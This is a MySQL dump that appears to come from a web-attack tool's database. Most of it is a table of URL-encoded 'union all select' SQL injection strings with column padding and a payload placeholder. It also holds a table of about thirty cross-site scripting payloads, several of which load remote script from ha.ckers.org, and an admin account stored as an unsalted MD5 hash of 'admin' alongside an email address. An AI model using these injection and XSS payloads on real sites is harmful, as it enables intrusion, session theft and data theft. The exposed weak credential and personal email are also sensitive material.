(57, '%20-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(58, '%20-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(59, '%20%27-6863%20union%20all%20select%20[payload]%23', '2013-02-22 10:10:36'),
(60, '%20%27-6863%20union%20all%20select%201,[payload]%23', '2013-02-22 10:10:36'),
(61, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(62, '%20%27-6863%20union%20all%20select%201,1,[payload]%23', '2013-02-22 10:10:36'),
(63, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(64, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(65, '%20%27-6863%20union%20all%20select%201,1,1,[payload]%23', '2013-02-22 10:10:36'),
(66, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(67, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(68, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(69, '%20%27-6863%20union%20all%20select%201,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(70, '%20%27-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(71, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(72, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(73, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(74, '%20%27-6863%20union%20all%20select%201,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(75, '%20%27-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(76, '%20%27-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(77, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(78, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(79, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(80, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(81, '%20%27-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(82, '%20%27-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(83, '%20%27-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(84, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(85, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(86, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(87, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(88, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(89, '%20%27-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(90, '%20%27-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(91, '%20%27-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(92, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(93, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(94, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(95, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(96, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(97, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(98, '%20%27-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(99, '%20%27-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(100, '%20%27-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(101, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(102, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(103, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(104, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,1,1,1,[payload]%23', '2013-02-22 10:10:36'),
(105, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1%23', '2013-02-22 10:10:36'),
(106, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1%23', '2013-02-22 10:10:36'),
(107, '%20%27-6863%20union%20all%20select%201,1,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1%23', '2013-02-22 10:10:36'),
(108, '%20%27-6863%20union%20all%20select%201,1,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1%23', '2013-02-22 10:10:36'),
(109, '%20%27-6863%20union%20all%20select%201,1,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1%23', '2013-02-22 10:10:36'),
(110, '%20%27-6863%20union%20all%20select%201,1,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(111, '%20%27-6863%20union%20all%20select%201,1,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(112, '%20%27-6863%20union%20all%20select%201,[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1,1%23', '2013-02-22 10:10:36'),
(113, '%20%27-6863%20union%20all%20select%20[payload], CURRENT_TIMESTAMP);1,1,1,1,1,1,1,1,1%23', '2013-02-22 10:10:36');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(40) NOT NULL,
  `password` varchar(32) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `isactive` int(1) NOT NULL,
  `email` varchar(80) NOT NULL,
  `last_login` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `membership` int(1) NOT NULL DEFAULT '0',
  `token` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `date`, `isactive`, `email`, `last_login`, `membership`, `token`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2013-02-20 16:13:39', 1, 'mr.lerie@gmail.com', '2013-02-20 16:13:39', 2, '698f20480488ae59d6ec3ac009315b38');

-- --------------------------------------------------------

--
-- Table structure for table `user_hashes`
--

CREATE TABLE IF NOT EXISTS `user_hashes` (
  `id` int(99) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `hash` varchar(32) NOT NULL,
  `added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `word` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `user_hashes`
--

INSERT INTO `user_hashes` (`id`, `uid`, `hash`, `added`, `word`) VALUES
(1, 1, '21232f297a57a5a743894a0e4a801fc3', '2013-02-20 14:16:42', 'admin'),
(2, 1, 'dd705d77256c38dd59d6b13879ba4333', '2013-02-20 14:17:10', '');

-- --------------------------------------------------------

--
-- Table structure for table `xss_strings`
--

CREATE TABLE IF NOT EXISTS `xss_strings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `string` text NOT NULL,
  `added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=31 ;

--
-- Dumping data for table `xss_strings`
--

INSERT INTO `xss_strings` (`id`, `string`, `added`) VALUES
(1, ''';alert(String.fromCharCode(88,83,83))//'';alert(String.fromCharCode(88,83,83))//";', '2013-02-20 14:41:12'),
(2, '></SCRIPT>">''><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>', '2013-02-20 14:41:25'),
(3, ''''';!--"<XSS>=&{()}', '2013-02-20 14:41:25'),
(4, '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>', '2013-02-20 14:41:42'),
(5, '<IMG SRC=javascript:alert(''XSS'')>', '2013-02-20 14:41:54'),
(6, '<IMG SRC=JaVaScRiPt:alert(''XSS'')>', '2013-02-20 14:41:54'),
(7, '<IMG SRC=javascript:alert("XSS")>', '2013-02-20 14:42:07'),
(8, '<IMG SRC=`javascript:alert("RSnake says, ''XSS''")`>', '2013-02-20 14:42:07'),
(9, '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">', '2013-02-20 14:42:19'),
(10, '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>', '2013-02-20 14:42:19'),
(11, '<IMG SRC=# onmouseover="alert(''xxs'')">', '2013-02-20 14:42:37'),
(12, '<IMG SRC= onmouseover="alert(''xxs'')">', '2013-02-20 14:42:37'),
(13, '<IMG onmouseover="alert(''xxs'')">', '2013-02-20 14:42:55'),
(14, '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;\r\n&#39;&#88;&#83;&#83;&#39;&#41;>', '2013-02-20 14:42:55'),
(15, '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&\r\n#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>', '2013-02-20 14:43:08'),
(16, '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>', '2013-02-20 14:43:08'),
(17, '<IMG SRC="jav	ascript:alert(''XSS'');">', '2013-02-20 14:43:18'),
(18, '<IMG SRC="jav&#x09;ascript:alert(''XSS'');">', '2013-02-20 14:43:18'),
(19, '<IMG SRC="jav&#x0A;ascript:alert(''XSS'');">', '2013-02-20 14:43:29'),
(20, '<IMG SRC="jav&#x0D;ascript:alert(''XSS'');">', '2013-02-20 14:43:29'),
(21, 'perl -e ''print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";'' > out', '2013-02-20 14:43:41'),
(22, '<IMG SRC=" &#14;  javascript:alert(''XSS'');">', '2013-02-20 14:43:41'),
(23, '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '2013-02-20 14:43:52'),
(24, '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>', '2013-02-20 14:43:52'),
(25, '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '2013-02-20 14:44:03'),
(26, '<<SCRIPT>alert("XSS");//<</SCRIPT>', '2013-02-20 14:44:03'),
(27, '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >', '2013-02-20 14:44:14'),
(28, '<SCRIPT SRC=//ha.ckers.org/.j>', '2013-02-20 14:44:14'),
(29, '<IMG SRC="javascript:alert(''XSS'')"', '2013-02-20 14:44:27'),
(30, '<iframe src=http://ha.ckers.org/scriptlet.html <', '2013-02-20 14:44:27');
